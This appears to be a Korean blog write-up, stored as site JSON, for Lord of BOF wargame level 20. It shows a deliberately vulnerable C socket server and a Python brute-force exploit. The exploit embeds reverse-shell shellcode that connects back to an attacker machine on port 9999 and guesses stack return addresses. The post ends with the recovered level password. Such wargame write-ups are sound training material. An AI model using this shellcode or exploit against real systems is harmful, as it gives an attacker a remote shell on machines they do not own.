{"componentChunkName":"component---node-modules-gatsby-theme-portfolio-minimal-src-templates-article-index-tsx","path":"/Lord-of-BOF-WriteUp-20/","result":{"pageContext":{"article":{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/4913b/0.png","srcSet":"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/57642/0.png 105w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/bd384/0.png 211w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/4913b/0.png 421w","sizes":"(min-width: 421px) 421px, 100vw"},"sources":[{"srcSet":"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/1f505/0.webp 105w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/b1747/0.webp 211w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/afe20/0.webp 421w","type":"image/webp","sizes":"(min-width: 421px) 421px, 100vw"}]},"width":660,"height":399.76247030878864}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">/*\r\n        The Lord of the BOF : The Fellowship of the BOF\r\n        - dark knight\r\n        - remote BOF\r\n*/</span>\r\n\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;errno.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;netinet/in.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/socket.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/wait.h></span></span>\r\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;dumpcode.h></span></span>\r\n\r\n<span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">40</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">int</span> server_fd<span class=\"token punctuation\">,</span> client_fd<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr_in</span> server_addr<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr_in</span> client_addr<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">int</span> sin_size<span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>server_fd <span class=\"token operator\">=</span> <span class=\"token function\">socket</span><span class=\"token punctuation\">(</span>AF_INET<span class=\"token punctuation\">,</span> SOCK_STREAM<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"socket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        server_addr<span class=\"token punctuation\">.</span>sin_family <span class=\"token operator\">=</span> AF_INET<span class=\"token punctuation\">;</span>\r\n        server_addr<span class=\"token punctuation\">.</span>sin_port <span class=\"token operator\">=</span> <span class=\"token function\">htons</span><span class=\"token punctuation\">(</span><span class=\"token number\">6666</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        server_addr<span class=\"token punctuation\">.</span>sin_addr<span class=\"token punctuation\">.</span>s_addr <span class=\"token operator\">=</span> INADDR_ANY<span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">bzero</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>server_addr<span class=\"token punctuation\">.</span>sin_zero<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">bind</span><span class=\"token punctuation\">(</span>server_fd<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>server_addr<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bind\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">listen</span><span class=\"token punctuation\">(</span>server_fd<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"listen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n\r\n        <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n                sin_size <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr_in</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>client_fd <span class=\"token operator\">=</span> <span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>server_fd<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sockaddr</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>client_addr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>sin_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"accept\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token punctuation\">}</span>\r\n\r\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n                        <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>client_fd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Death Knight : Not even death can save you from me!\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>client_fd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"You : \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token function\">recv</span><span class=\"token punctuation\">(</span>client_fd<span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">256</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token punctuation\">}</span>\r\n\r\n                <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>client_fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n                <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token function\">waitpid</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span>WNOHANG<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>server_fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>평범한 소켓 통신 서버 역할을 하는 프로그램이며, 원격접속한 사용자로부터 입력값을 받고 있다. 그리고 이를 통해 Buffer Overflow(이하 BOF)가 발생하게 된다. 그리고 이전의 문제들과 다르게 이 버퍼에는 아무런 보호조치가 되어있지 않다. 결국 이 문제는 원격지에서 이 LOB 서버로 접속한 후, 쉘코드와 함께 bof를 발생시키면 된다. 우선 따로 만든 공격지에서 LOB 서버 6666번 포트로 nc 명령어를 사용하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 421px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.545454545454545%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAg0lEQVR42p2NSRKEIBAE8aDSQONJGjcc///InBj8wRzyUBUVWe55PrR2cd+NYoWcM2bGWlZKKdRtY9t3au8KxYyrNWIMjNOEiOC97wzDgMtZSUk5zoOkCeccEgLTNBJiZJ5nkuqbQ0DE40W6KMTQt5oVVX2FtVasGud5sCxLf/pJ/+ULPSdDymjjM9cAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/c9b55/0.webp 165w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/f2908/0.webp 330w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/ced8d/0.webp 421w\"\n              sizes=\"(max-width: 421px) 100vw, 421px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/04c57/0.png 165w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/d9ecf/0.png 330w,\n/static/a1b6f8dc9f9fe003aed501f3aac5c78d/092ed/0.png 421w\"\n            sizes=\"(max-width: 421px) 100vw, 421px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a1b6f8dc9f9fe003aed501f3aac5c78d/092ed/0.png\"\n            alt=\"nc\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>위와 같이 입력값을 받고 있다.\r\n공격지인 다른 리눅스 로컬로 리버스 쉘코드를 사용한 브루트 포스 코드를 작성해 두었다. 원격에서 공격하는 만큼 ret주소를 알 수 없기 때문에 브루트 포스를 사용했다.</p>\n<p><a href=\"https://orang.tistory.com/entry/%ED%95%B4%EC%BB%A4%EC%8A%A4%EC%BF%A8-LOB-xavius-deathknight-by-ORANG\">Reverse shellcode 출처</a></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">import sys<span class=\"token punctuation\">,</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">,</span> socket\r\n\r\nhost <span class=\"token operator\">=</span> <span class=\"token string\">\"192.168.235.135\"</span>\r\nport <span class=\"token operator\">=</span> <span class=\"token number\">6666</span>\r\n\r\nhexhost <span class=\"token operator\">=</span> <span class=\"token string\">\"\\xc0\\xa8\\xeb\\x8a\"</span> # <span class=\"token number\">192.168</span><span class=\"token number\">.235</span><span class=\"token number\">.138</span>\r\nrecvhexport <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x27\\x0f\"</span> # port <span class=\"token number\">9999</span>\r\n\r\nshellcode <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\"</span> <span class=\"token operator\">+</span> hexhost <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x68\\x02\\x00\"</span> <span class=\"token operator\">+</span> recvhexport <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"</span><span class=\"token number\">10</span> \r\npadding1 <span class=\"token operator\">=</span> <span class=\"token string\">\"A\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">44</span>\r\npadding2 <span class=\"token operator\">=</span> <span class=\"token string\">\"\\x90\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">50</span>\r\npayload <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\r\n\r\n<span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\r\n\t<span class=\"token keyword\">for</span> j in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\r\n\t\t<span class=\"token keyword\">for</span> k in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\r\n\t\t \tr <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span><span class=\"token function\">socket</span><span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>\r\n\t\t \tr<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\t\t \tretaddr <span class=\"token operator\">=</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token function\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\xbf\"</span>\r\n\t\t \t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"RET: \"</span> <span class=\"token operator\">+</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span><span class=\"token function\">hex</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span><span class=\"token punctuation\">.</span><span class=\"token function\">unpack</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I\"</span><span class=\"token punctuation\">,</span> retaddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\t\t \tpayload <span class=\"token operator\">+=</span> padding1\r\n\t\t \tpayload <span class=\"token operator\">+=</span> retaddr\r\n\t\t \tpayload <span class=\"token operator\">+=</span> padding2\r\n\t\t \tpayload <span class=\"token operator\">+=</span> shellcode\r\n\t\t \t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token number\">52</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\t\t \t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span><span class=\"token function\">recv</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n\t\t \tr<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\r\n\t\t \tr<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>LOB 서버에 6666번 포트로 연결하고, receive를 9999번 포트로 받으려고 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 363px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13.333333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAAf0lEQVR42p2NwQqDMBQEE2wE9ZkoJM8krVL9/3+cYqCn3noYdlhY1hzHznmd7PuLWgvrurIsgZgS4zCQVEka0ay8r5O+d1hrG8YYuq5r/nAO5xwmxdjGuWR88ITgkVmai3xzYhIh1yfbpnjvGccBmWdy1uZRE6WW+8TwL9b+9h/esUM2Lp/6BwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b754a2d60308b14589a7e62b310190cb/c9b55/1.webp 165w,\n/static/b754a2d60308b14589a7e62b310190cb/f2908/1.webp 330w,\n/static/b754a2d60308b14589a7e62b310190cb/2ed29/1.webp 363w\"\n              sizes=\"(max-width: 363px) 100vw, 363px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b754a2d60308b14589a7e62b310190cb/04c57/1.png 165w,\n/static/b754a2d60308b14589a7e62b310190cb/d9ecf/1.png 330w,\n/static/b754a2d60308b14589a7e62b310190cb/4e786/1.png 363w\"\n            sizes=\"(max-width: 363px) 100vw, 363px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b754a2d60308b14589a7e62b310190cb/4e786/1.png\"\n            alt=\"nc2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>nc로 공격지에서 listen 모드로 9999번 포트를 열어두고, 위의 브루트포스 코드를 실행시킨다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.424242424242426%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAA7CAAAOwgEVKEqAAAAApklEQVR42mWOyQ7DIBBDIawDAYlmoY1I+/9f6ZbJcunhycYYC/H+fNBaQ60rSimYpgnzPGPbNqSUkHPivDwKrLVQSrF2jDFwzt2Z1gpiWZa74JzlwuEdvPfw/lB3ah8JIYCIuEOBoLUGkYe1BqI+X/yLPka9GAjOWhAFfhhiZB3HyAPxPHe6jzFASgEhTtq+Y60rcs4YhgFSSubyXS/4bpB/+T324wt7MFfaxfoQUgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6f153b8d5d1f2065a95ce296083e8169/c9b55/2.webp 165w,\n/static/6f153b8d5d1f2065a95ce296083e8169/f2908/2.webp 330w,\n/static/6f153b8d5d1f2065a95ce296083e8169/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6f153b8d5d1f2065a95ce296083e8169/04c57/2.png 165w,\n/static/6f153b8d5d1f2065a95ce296083e8169/d9ecf/2.png 330w,\n/static/6f153b8d5d1f2065a95ce296083e8169/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6f153b8d5d1f2065a95ce296083e8169/32056/2.png\"\n            alt=\"exploit\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>my-pass: got the life</p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"168817f1-8a90-5acd-a68d-44960dce9075","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-20/","title":"LOB 20번 (xavius -> death_night)","readingTime":{"text":"3 min read"}},"listingPagePath":"/blog"}},"staticQueryHashes":["1094019748","460736852"],"slicesMap":{}}